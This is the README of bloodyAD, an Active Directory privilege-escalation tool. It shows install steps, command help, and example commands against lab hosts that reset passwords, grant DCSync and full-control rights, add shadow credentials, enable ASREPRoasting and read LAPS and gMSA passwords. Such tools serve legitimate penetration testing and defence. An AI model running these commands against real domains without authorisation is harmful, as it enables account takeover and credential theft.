> :warning: autobloody has been moved to its own [repo](https://github.com/CravateRouge/autobloody)  

# ![bloodyAD logo](https://repository-images.githubusercontent.com/415977068/9b2fed72-35fb-4faa-a8d3-b120cd3c396f) bloodyAD

`bloodyAD.py` is an Active Directory privilege escalation swiss army knife

## Description

This tool can perform specific LDAP/SAMR calls to a domain controller in order to perform AD privesc.

`bloodyAD` supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc.

It is designed to be used transparently with a SOCKS proxy.

## Installation

First if you run it on Linux, you must have `libkrb5-dev` installed on your OS in order for kerberos to work:
```ps1
# Debian/Ubuntu/Kali
apt-get install libkrb5-dev

# Centos/RHEL
yum install krb5-devel

# Fedora
dnf install krb5-devel

# Arch Linux
pacman -S krb5
```

A python package is available:

```ps1
pip install bloodyAD
bloodyAD --host 172.16.1.15 -d bloody.local -k set password john.doe 'Password123!'
```

Or you can clone the repo:

```ps1
git clone --depth 1 https://github.com/CravateRouge/bloodyAD
pip install .
bloodyAD --host 172.16.1.15 -d bloody.local -k set password john.doe 'Password123!'
```

### Dependencies

- Python 3
- DSinternals
- Impacket
- Ldap3
- Gssapi (linux) or Winkerberos (Windows)

## Usage

Simple usage:

```ps1
bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :70016778cb0524c799ac25b439bd6a31 set password john.doe 'Password123!'
```

**Note:** You can find more examples on <https://cravaterouge.github.io/> and in the documentation folder of this project

### Global arguments
```ps1
$ bloodyAD -h

usage: bloodyAD.py [-h] [-d DOMAIN] [-u USERNAME] [-p PASSWORD] [-k] [-c CERTIFICATE] [-s] [--host HOST] [-v {QUIET,INFO,DEBUG}] {add,get,remove,set} ...

AD Privesc Swiss Army Knife

options:
  -h, --help            show this help message and exit
  -d DOMAIN, --domain DOMAIN
                        Domain used for NTLM authentication
  -u USERNAME, --username USERNAME
                        Username used for NTLM authentication
  -p PASSWORD, --password PASSWORD
                        Cleartext password or LMHASH:NTHASH for NTLM authentication
  -k, --kerberos
  -c CERTIFICATE, --certificate CERTIFICATE
                        Certificate authentication, e.g: "path/to/key:path/to/cert"
  -s, --secure          Try to use LDAP over TLS aka LDAPS (default is LDAP)
  --host HOST           Hostname or IP of the DC (ex: my.dc.local or 172.16.1.3)
  -v {QUIET,INFO,DEBUG}, --verbose {QUIET,INFO,DEBUG}
                        Adjust output verbosity

Commands:
  {add,get,remove,set}
    add                 [ADD] function category
    get                 [GET] function category
    remove              [REMOVE] function category
    set                 [SET] function category
```

### Commands Arguments
Help text to use a specific function:

```ps1
$ bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :70016778cb0524c799ac25b439bd6a31 set password -h
usage: bloodyAD.py set password [-h] [--oldpass OLDPASS] target newpass

positional arguments:
  target             sAMAccountName, DN, GUID or SID of the target
  newpass            new password for the target

options:
  -h, --help         show this help message and exit
  --oldpass OLDPASS  old password of the target, mandatory if you don't have "change password" permission on the target (default: None)
  ```

#### Get Commands
```ps1
$ bloodyAD --host 10.1.0.4 -d bloody -u bloodyAdmin -c ":bloodyadmin.pem" -s get -h

usage: bloodyAD get [-h] {children,dnsDump,membership,object,search,writable} ...

options:
  -h, --help            show this help message and exit

get commands:
  {children,dnsDump,membership,object,search,writable}
    children            Lists children for a given target object
    dnsDump             Retrieves DNS records of the Active Directory readable/listable by the user
    membership          Retrieves SID and SAM Account Names of all groups a target belongs to
    object              Retrieves LDAP attributes for the target object provided, binary data will be outputed in base64
    search              Searches in LDAP database, binary data will be outputed in base64
    writable            Retrieves objects writable by client
```
#### Set Commands
```ps1
$ bloodyAD --host 10.1.0.4 -d bloody -u bloodyAdmin -c ":bloodyadmin.pem" -s set -h

usage: bloodyAD set [-h] {object,owner,password} ...

options:
  -h, --help            show this help message and exit

set commands:
  {object,owner,password}
    object              Add/Replace/Delete target's attribute
    owner               Changes target ownership with provided owner (WriteOwner permission required)
    password            Change password of a user/computer
```

#### Add Commands
```ps1
$ bloodyAD --host 10.1.0.4 -d bloody -u bloodyAdmin -c ":bloodyadmin.pem" -s add -h
usage: bloodyAD add [-h] {computer,dcsync,dnsRecord,genericAll,groupMember,rbcd,shadowCredentials,uac,user} ...

options:
  -h, --help            show this help message and exit

add commands:
  {computer,dcsync,dnsRecord,genericAll,groupMember,rbcd,shadowCredentials,uac,user}
    computer            Adds new computer
    dcsync              Adds DCSync right on domain to provided trustee (Requires to own or to have WriteDacl on domain object)
    dnsRecord           This function adds a new DNS record into an AD environment.
    genericAll          Gives full control to trustee on target (you must own the object or have WriteDacl)
    groupMember         Adds a new member (user, group, computer) to group
    rbcd                Adds Resource Based Constraint Delegation for service on target, used to impersonate a user on target with service (Requires
                        "Write" permission on target's msDS-AllowedToActOnBehalfOfOtherIdentity and Windows Server >= 2012)
    shadowCredentials   Adds Key Credentials to target, used to impersonate target with added credentials
    uac                 Adds property flags altering user/computer object behavior
    user                Adds a new user
```

#### Remove Commands
```ps1
$ bloodyAD --host 10.1.0.4 -d bloody -u bloodyAdmin -c ":bloodyadmin.pem" -s remove -h

usage: bloodyAD remove [-h] {dcsync,dnsRecord,genericAll,groupMember,object,rbcd,shadowCredentials,uac} ...

options:
  -h, --help            show this help message and exit

remove commands:
  {dcsync,dnsRecord,genericAll,groupMember,object,rbcd,shadowCredentials,uac}
    dcsync              Removes DCSync right for provided trustee
    dnsRecord           Removes a DNS record of an AD environment.
    genericAll          Removes full control of trustee on target
    groupMember         Removes member (user, group, computer) from group
    object              Removes object (user, group, computer, organizational unit, etc)
    rbcd                Removes Resource Based Constraint Delegation for service on target
    shadowCredentials   Removes Key Credentials from target
    uac                 Removes property flags altering user/computer object behavior
```

## How it works

bloodyAD communicates with a DC using mainly the LDAP protocol in order to get information or add/modify/delete AD objects. Exchange of sensitive information such as passwords without LDAPS are now supported.

## Useful commands

```ps1
# Get group members
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object Users --attr member 

# Get minimum password length policy
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr minPwdLength

# Get AD functional level
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr msDS-Behavior-Version

# Get all users of the domain
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type user

# Get all computers of the domain
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type computer

# Get all containers of the domain
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type container

# Enable DONT_REQ_PREAUTH for ASREPRoast
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 add uac john.doe DONT_REQ_PREAUTH

# Disable ACCOUNTDISABLE
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 remove uac john.doe ACCOUNTDISABLE

# Get UserAccountControl flags
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 get object john.doe --attr userAccountControl

# Read GMSA account password
bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword

# Read LAPS password
bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'COMPUTER$' --attr ms-Mcs-AdmPwd

# Read quota for adding computer objects to domain
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr ms-DS-MachineAccountQuota

# Add a new DNS entry
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 add dnsRecord my_machine_name 192.168.10.48

# Remove a DNS entry
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 remove dnsRecord my_machine_name 192.168.10.48

# Get AD DNS records
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 get dnsDump

```

## Support
Like this project? Donations are welcome [![](https://img.shields.io/static/v1?label=Sponsor&message=%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://github.com/sponsors/CravateRouge)

Need personalized support? send me an [email](mailto:baptiste.crepin@ntymail.com) for trainings or custom features.

## Acknowledgements
- Thanks to [impacket](https://github.com/fortra/impacket) contributors. [Structures](https://github.com/fortra/impacket/blob/master/impacket/structure.py) and several [LDAP attacks](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/ldapattack.py) are based on their work.
- Thanks to [@PowerShellMafia](https://github.com/PowerShellMafia) team ([PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)) and their work on AD which inspired this tool.
- Thanks to [@dirkjanm](https://github.com/dirkjanm) ([adidnsdump.py](https://github.com/dirkjanm/adidnsdump)) and ([@Kevin-Robertson](https://github.com/Kevin-Robertson))([Invoke-DNSUpdate.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1)) for their work on AD DNS which inspired DNS functionnalities.
- Thanks to [@p0dalirius](https://github.com/p0dalirius/) and his [pydsinternals](https://github.com/p0dalirius/pydsinternals) module which helped to build the shadow credential attack
